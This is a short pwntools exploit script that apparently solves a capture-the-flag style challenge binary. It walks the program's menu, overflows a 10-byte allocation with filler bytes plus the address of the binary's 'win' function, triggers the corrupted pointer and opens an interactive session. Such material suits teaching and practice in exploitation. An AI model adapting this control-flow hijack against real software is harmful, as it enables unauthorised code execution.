#!/usr/bin/env python3
import sys
from time import sleep
from multiprocessing import Process
import pwn

pwn.context.terminal = ["tmux","splitw","-h"]

def start(argv=[], *a, **kw):
    if pwn.args.GDB:  # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath] + argv, gdbscript=gdbscript, *a, **kw)
    elif pwn.args.REMOTE:  # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # run locally, no GDB
        return pwn.process([binPath] + argv, *a, **kw)

binPath = "/challenge/challenge3"

gdbscript = '''
break *main+275
continue
'''.format(**locals())

elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
pwn.context.log_level = "debug"

io = start()

io.recvuntil(b": ") # main menu, sent option 1
io.sendline(b"1")

io.recvuntil(b": ") # size, sent 10
io.sendline(b"10")

io.recvuntil(b": ") # data, sent 10
io.sendline(b"ABCDEFGHIJKLMNOP"+pwn.p64(elf.symbols["win"]))

io.recvuntil(b": ") # main menu, sent option 2
io.sendline(b"2")

io.recvuntil(b": ") # main menu, sent option 4
io.sendline(b"4")

io.recvuntil(b": ") # main menu, sent option 5
io.sendline(b"5")

io.recvline()
io.sendline(b"3")
io.interactive()
